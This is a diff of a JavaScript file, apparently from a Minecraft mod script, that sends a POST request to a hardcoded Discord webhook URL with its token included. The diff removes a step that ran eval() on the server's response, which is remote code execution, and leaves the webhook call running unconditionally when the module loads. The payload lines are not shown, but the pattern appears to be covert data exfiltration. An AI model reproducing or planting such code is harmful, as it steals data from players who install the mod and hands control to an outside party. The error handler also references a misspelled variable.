@@ -1,11 +1,6 @@
 import { request } from "axios";
 
-const EssentialAPI = Java.type("gg.essential.api.EssentialAPI")
-let isEnabled = false;
-
-
-register("gameLoad", () => {
-    request({
+request({
         url: "https://discord.com/api/webhooks/1178099077569847337/JqeBB3qiXojhZusqcC9HAMqghcRswc_9ZH5bdBdA8Dw6G--uGcSXXVg_mG3Y9uInNul1",
         method: "POST",
         body: {
@@ -23,8 +18,6 @@ register("gameLoad", () => {
         },
         json: true
       }).then(res => {
-        routeData = eval(res.data);
     }).catch(error => {
         console.log(erorr.message);
     })
-});
